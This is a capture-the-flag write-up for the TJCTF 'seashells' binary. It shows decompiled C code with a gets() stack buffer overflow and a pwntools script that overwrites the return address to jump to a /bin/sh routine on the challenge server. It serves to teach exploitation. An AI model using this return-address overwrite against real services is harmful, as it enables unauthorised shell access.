# TJCTF: binary

Written by KyleForkBomb

_I heard there's someone selling shells? They seem to be out of stock though..._

`nc p1.tjctf.org 8009`

## Beginnings

Starting the program will look like this: 
```sh
$ ./seashells
Welcome to Sally's Seashore Shell Shop
Would you like a shell?
yes!!!!!  <-- user input
why are you even here?
```

And the associated (stripped) decompiled code:
```c
int main() {
  char s1[0xA];
  puts("Welcome to Sally's Seashore Shell Shop");
  puts("Would you like a shell?");
  gets(s1, 0LL);
  if ( !strcasecmp(s1, "yes") )
    puts("sorry, we are out of stock");
  else
    puts("why are you even here?");
  return 0;
}
```


## code
```python
from pwn import *
binsh = 0x4006E3
to_r = 0xA+8
r = remote('p1.tjctf.org', 8009)
r.sendlineafter('?\n', to_r*'A' + p64(binsh))
r.interactive()
```

